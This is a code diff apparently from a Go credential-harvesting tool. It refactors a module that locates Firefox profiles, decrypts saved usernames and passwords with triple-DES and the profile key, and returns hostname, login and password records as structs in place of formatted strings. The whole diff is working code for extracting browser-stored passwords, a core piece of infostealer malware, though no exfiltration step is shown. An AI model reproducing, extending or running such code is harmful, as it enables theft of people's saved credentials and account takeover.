@@ -14,7 +14,6 @@ import (
 	"crypto/des"
 	"crypto/cipher"
 	"bytes"
-	"fmt"
 	"io/ioutil"
 	"encoding/json"
 	"encoding/base64"
@@ -382,7 +381,7 @@ func mozillaGetLoginData(profile string) []mozillaLoginData {
 	return LoginsList
 }
 
-func mozillaModuleStart(data AppInfo) ([]string, bool){
+func mozillaModuleStart(data AppInfo) ([]common.CredentialsData, bool){
 	if _, err := os.Stat(data.path); err == nil {
 		var profiles= getFirefoxProfiles(data.path)
 		for i := range profiles {
@@ -397,7 +396,7 @@ func mozillaModuleStart(data AppInfo) ([]string, bool){
 			if len(credentials) == 0 || len(key)==0 || key == nil{
 				return nil, false
 			}
-			var data []string
+			var data []common.CredentialsData
 			for j := range credentials{
 				var (
 					loginWithTrash    = tripleDesDecrypt(credentials[j].userName.cipherText, key, credentials[j].userName.Iv)
@@ -409,10 +408,11 @@ func mozillaModuleStart(data AppInfo) ([]string, bool){
 				var(
 					loginLength = len(loginWithTrash)
 					passwordLength = len(passwordWithTrash)
-					login = loginWithTrash[:loginLength-int(loginWithTrash[loginLength-1])]
-					password = passwordWithTrash[:passwordLength-int(passwordWithTrash[passwordLength-1])]
+					login = string(loginWithTrash[:loginLength-int(loginWithTrash[loginLength-1])])
+					password = string(passwordWithTrash[:passwordLength-int(passwordWithTrash[passwordLength-1])])
 				)
-				data = append(data, fmt.Sprintf("%s %s %s", credentials[j].hostname, login, password))
+				//data = append(data, fmt.Sprintf("%s %s %s", credentials[j].hostname, login, password))
+				data = append(data, common.CredentialsData{credentials[j].hostname, login, password})
 			}
 			return data, true
 		}
